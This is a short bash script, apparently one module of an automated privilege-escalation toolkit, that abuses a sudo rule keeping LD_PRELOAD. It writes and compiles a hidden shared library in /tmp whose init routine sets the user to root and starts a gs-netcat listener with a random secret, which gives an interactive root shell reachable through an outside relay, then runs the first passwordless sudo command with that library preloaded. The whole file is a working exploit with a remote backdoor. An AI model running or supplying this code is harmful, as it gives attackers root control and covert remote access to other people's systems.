#!/bin/bash
source "$(dirname "$0")/00_common.sh"
METHOD="ldpreload"
info "Checking LD_PRELOAD..."
sudo -n -l 2>/dev/null|grep -q "env_keep.*LD_PRELOAD" || { result_json "$METHOD" "skip" "LD_PRELOAD not kept"; exit 1; }
cat > /tmp/.x.c << 'XEOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init(){unsetenv("LD_PRELOAD");setuid(0);setgid(0);system("gs-netcat -s XXXSECRETXXX -l -i &");}
XEOF
secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20)
sed -i "s/XXXSECRETXXX/$secret/" /tmp/.x.c
gcc -fPIC -shared -o /tmp/.x.so /tmp/.x.c -nostartfiles 2>/dev/null || { result_json "$METHOD" "fail" "gcc failed"; exit 1; }
sudo_cmd=$(sudo -n -l 2>/dev/null|grep NOPASSWD|head -1|awk '{print $NF}')
[ -n "$sudo_cmd" ] && { sudo LD_PRELOAD=/tmp/.x.so "$sudo_cmd" 2>/dev/null; result_json "$METHOD" "success" "$sudo_cmd" "$secret"; exit 0; }
result_json "$METHOD" "fail" "No sudo cmd"; exit 1
